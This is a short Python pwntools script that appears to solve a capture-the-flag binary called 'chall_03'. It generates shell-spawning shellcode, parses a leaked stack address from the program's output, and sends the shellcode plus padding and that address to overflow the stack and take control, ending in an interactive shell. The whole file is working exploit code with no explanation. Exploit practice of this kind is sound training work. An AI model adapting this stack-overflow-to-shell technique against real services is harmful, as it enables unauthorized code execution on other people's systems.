# coding: utf-8
from pwn import *
context.arch="amd64"
elf=ELF("./chall_03")
shellcode = asm(shellcraft.sh())
len(shellcode)
p=process("./chall_03")
#0x140
#320-48
p.recvuntil("\n")
leak = p.recv()
stackleak = int(leak[-15:],16)
payload = shellcode+b'a'*280+p64(stackleak)
p.sendline(payload)
p.interactive()
